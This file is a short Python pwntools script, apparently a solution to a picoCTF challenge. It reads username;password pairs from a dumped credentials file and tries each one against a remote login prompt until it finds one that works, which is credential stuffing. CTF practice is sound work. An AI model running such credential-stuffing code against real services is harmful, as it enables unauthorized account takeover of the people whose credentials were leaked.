from os import system
from typing import Callable

from pwn import *

context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

# ELF_PATH = ""
# elf = ELF(ELF_PATH)


def try_credential(fact: Callable[[], tube], username: str, password: str) -> bool:
    p = fact()
    p.recvuntil(b"Username: ")
    p.sendline(username.encode())
    p.recvuntil(b"Password: ")
    p.sendline(password.encode())
    p.recvline()  # Feedback password
    p.recvline()  # newline

    response = p.recvline().strip()
    p.close()
    return not b"Invalid" in response


def solve(fact: Callable[[], tube]) -> None:
    with open("creds-dump.txt", "r") as f:
        for line in f.read().splitlines()[30:]:
            username, password = line.strip().split(";")
            if try_credential(fact, username, password):
                print(f"Found valid credential: {username}:{password}")
                return


def main() -> None:
    # gdb.attach(p, gdbscript="display /4i $pc\ncontinue\n")
    # p = lambda: process([ELF_PATH])
    p = lambda: remote("crystal-peak.picoctf.net", 60550)
    solve(p)


if __name__ == "__main__":
    main()
